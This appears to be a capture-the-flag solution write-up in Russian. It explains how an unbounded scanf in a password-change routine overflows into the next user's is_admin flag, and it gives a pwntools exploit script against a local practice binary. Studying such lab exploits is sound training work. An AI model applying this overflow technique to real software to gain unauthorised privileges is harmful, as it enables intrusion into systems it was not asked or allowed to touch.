# Solution
В функции `change_password` scanf не проверяет размер читываемого буфера, поэтому можно переписать переменную `is_admin` следующего в списке пользователя на `1` (и в целом на что угодно) и получить флаг.
Стоит обратить внимание, что scanf при чтении строки всегда ставит в конце нулевой байт, поэтому нужно добавить `admin` в конец, чтобы не перезаписать имя следующего пользователя.

```py
from pwn import *

io = process("./admin")

def choice(c: int):
    io.sendlineafter(b"> ", str(c).encode())

def register(name: bytes, password: bytes):
    choice(1)
    io.sendlineafter(b"name: ", name)
    io.sendlineafter(b"password: ", password)

def login(name: bytes, password: bytes):
    choice(2)
    io.sendlineafter(b"name: ", name)
    io.sendlineafter(b"password: ", password)

def admin_panel():
    choice(3)

def change_password(old_password: bytes, new_password: bytes):
    choice(4)
    io.sendlineafter(b"current password: ", old_password)
    io.sendlineafter(b"new password: ", new_password)

register(b"test", b"test")
register(b"admin", b"admin")

login(b"test", b"test")
change_password(b"test", b"A" * 20 + p32(1) + b"admin")
# + b"admin" need to prevent scanf's overwriting username of next user

login(b"admin", b"admin")
admin_panel()

io.interactive()
```
